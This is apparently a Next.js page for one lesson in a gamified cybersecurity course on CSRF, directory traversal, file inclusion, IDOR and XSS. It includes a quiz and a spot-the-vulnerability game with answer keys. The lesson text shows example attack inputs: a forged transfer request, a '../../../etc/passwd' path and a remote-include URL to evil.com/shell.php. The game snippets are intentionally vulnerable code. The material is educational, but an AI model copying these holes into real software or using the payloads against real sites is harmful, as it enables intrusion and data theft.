'use client';
import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import MissionHeader from '@/components/MissionHeader';
import MissionComplete from '@/components/MissionComplete';
import { completeMission, loseLife } from '@/lib/gameState';

const lessons = [
  {
    title: "CSRF & Other Web Attacks",
    content: "🔴 CSRF (Cross-Site Request Forgery) — Trick a logged-in user into performing actions they didn't intend.\n\nExample: You're logged into your bank. A malicious site has:\n<img src=\"https://bank.com/transfer?to=hacker&amount=1000\">\n\nYour browser sends the request WITH your cookies. The bank thinks it's you!\n\n🛡️ Defense: CSRF tokens — unique tokens per form submission that attackers can't guess.",
  },
  {
    title: "More Web Vulnerabilities",
    content: "🔴 Directory Traversal — Access files outside the web root\n  https://site.com/file?name=../../../etc/passwd\n\n🔴 Local File Inclusion (LFI) — Include server files\n  https://site.com/page?file=../../config.php\n\n🔴 Remote File Inclusion (RFI) — Include external files\n  https://site.com/page?file=http://evil.com/shell.php\n\n🔴 IDOR (Insecure Direct Object Reference) — Access other users' data by changing IDs\n  /api/user/123/profile → /api/user/124/profile\n\n🛡️ Defenses: Input validation, access controls, never use user input in file paths.",
  },
];

const vulnSnippets: { code: string; vuln: string; options: string[]; correct: number; explanation: string }[] = [
  {
    code: `app.get('/profile', (req, res) => {\n  const userId = req.query.id;\n  db.query("SELECT * FROM users WHERE id=" + userId);\n});`,
    vuln: "SQL Injection", options: ['XSS', 'SQL Injection', 'CSRF', 'IDOR'], correct: 1,
    explanation: "User input is concatenated directly into SQL query without parameterization."
  },
  {
    code: `app.get('/file', (req, res) => {\n  const filename = req.query.name;\n  res.sendFile('/uploads/' + filename);\n});`,
    vuln: "Directory Traversal", options: ['Directory Traversal', 'XSS', 'CSRF', 'SQLi'], correct: 0,
    explanation: "User can input ../../../etc/passwd to access files outside /uploads/."
  },
  {
    code: `<form action="/transfer" method="POST">\n  <input name="amount" value="1000">\n  <input name="to" value="friend">\n  <button>Send</button>\n</form>\n<!-- No CSRF token! -->`,
    vuln: "CSRF", options: ['XSS', 'SQLi', 'CSRF', 'IDOR'], correct: 2,
    explanation: "No CSRF token means any website can submit this form on behalf of a logged-in user."
  },
  {
    code: `app.get('/api/invoice/:id', (req, res) => {\n  // No check if user owns this invoice!\n  const invoice = db.getInvoice(req.params.id);\n  res.json(invoice);\n});`,
    vuln: "IDOR", options: ['XSS', 'CSRF', 'Directory Traversal', 'IDOR'], correct: 3,
    explanation: "Any user can access any invoice by changing the ID. No authorization check!"
  },
  {
    code: `const comment = req.body.comment;\nres.send(\`<div class="comment">\${comment}</div>\`);`,
    vuln: "XSS", options: ['SQL Injection', 'XSS', 'CSRF', 'LFI'], correct: 1,
    explanation: "User input is rendered as HTML without sanitization. Script tags will execute."
  },
];

export default function CSRFAndMore() {
  const [step, setStep] = useState(0);
  const [snippetIdx, setSnippetIdx] = useState(0);
  const [snippetScore, setSnippetScore] = useState(0);
  const [feedback, setFeedback] = useState<string | null>(null);
  const [snippetsDone, setSnippetsDone] = useState(false);
  const [quizStep, setQuizStep] = useState(0);
  const [complete, setComplete] = useState(false);

  const handleSnippet = (answer: number) => {
    const correct = answer === vulnSnippets[snippetIdx].correct;
    if (correct) setSnippetScore(s => s + 1);
    setFeedback(vulnSnippets[snippetIdx].explanation);
    setTimeout(() => {
      setFeedback(null);
      if (snippetIdx + 1 >= vulnSnippets.length) setSnippetsDone(true);
      else setSnippetIdx(snippetIdx + 1);
    }, 2500);
  };

  const quizQuestions = [
    { q: "CSRF attacks work because...", options: ['Browsers send cookies automatically with requests', 'Passwords are weak', 'SQL is insecure', 'Servers don\'t use HTTPS'], correct: 0 },
    { q: "Directory traversal uses which characters?", options: ['<script>', '../', 'OR 1=1', '&amp;'], correct: 1 },
    { q: "IDOR can be prevented by...", options: ['Using HTTPS', 'Checking if the user has permission to access the resource', 'Adding more CSS', 'Using a CDN'], correct: 1 },
  ];

  const handleQuiz = (answer: number) => {
    if (answer === quizQuestions[quizStep].correct) {
      if (quizStep + 1 >= quizQuestions.length) {
        completeMission('sec-3-3', 70);
        setTimeout(() => setComplete(true), 500);
      } else setQuizStep(quizStep + 1);
    } else loseLife();
  };

  if (complete) return <MissionComplete xp={70} message="Web attack knowledge complete! 🕸️" backHref="/path/cybersecurity" />;

  return (
    <div className="pb-8">
      <MissionHeader chapter={3} title="CSRF & Other Web Attacks" pathId="cybersecurity" />
      <AnimatePresence mode="wait">
        {step < 2 && (
          <motion.div key={`l-${step}`} initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} className="space-y-4">
            <div className="card">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono px-2 py-1 rounded bg-red-900/30 text-red-400">{step + 1}/2</span>
                <h2 className="font-semibold">{lessons[step].title}</h2>
              </div>
              <p className="text-gray-300 text-sm leading-relaxed whitespace-pre-line">{lessons[step].content}</p>
            </div>
            <button onClick={() => setStep(step + 1)} className="btn-primary w-full">{step < 1 ? 'Next →' : 'Spot the Vulnerability →'}</button>
          </motion.div>
        )}

        {step === 2 && !snippetsDone && (
          <motion.div key="snippets" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} className="space-y-4">
            <div className="card border-red-800/30">
              <h2 className="font-semibold mb-2 text-red-400">🎯 Spot the Vulnerability</h2>
              <p className="text-xs text-gray-500 mb-3">{snippetIdx + 1}/{vulnSnippets.length}</p>
              <pre className="bg-black/50 rounded-lg p-3 font-mono text-xs text-gray-300 overflow-x-auto mb-4 whitespace-pre-wrap">{vulnSnippets[snippetIdx].code}</pre>
              {feedback ? (
                <div className="p-3 rounded-lg bg-gray-800/50 text-sm text-gray-300">{feedback}</div>
              ) : (
                <div className="grid grid-cols-2 gap-2">
                  {vulnSnippets[snippetIdx].options.map((opt, i) => (
                    <button key={i} onClick={() => handleSnippet(i)} className="p-3 rounded-lg bg-gray-800/50 hover:bg-gray-700/50 transition-colors text-sm">{opt}</button>
                  ))}
                </div>
              )}
            </div>
          </motion.div>
        )}

        {step === 2 && snippetsDone && (
          <motion.div key="done" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} className="space-y-4">
            <div className="card"><h3 className="font-semibold mb-2">Score: {snippetScore}/{vulnSnippets.length}</h3></div>
            <button onClick={() => setStep(3)} className="btn-primary w-full">Take the Quiz →</button>
          </motion.div>
        )}

        {step === 3 && (
          <motion.div key="quiz" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} className="space-y-4">
            <div className="card">
              <h3 className="font-semibold mb-3">📝 Quiz ({quizStep + 1}/{quizQuestions.length})</h3>
              <p className="text-sm mb-4">{quizQuestions[quizStep].q}</p>
              {quizQuestions[quizStep].options.map((opt, i) => (
                <button key={i} onClick={() => handleQuiz(i)} className="w-full text-left p-3 rounded-lg mb-2 text-sm bg-gray-800/50 hover:bg-gray-700/50 transition-colors">{opt}</button>
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
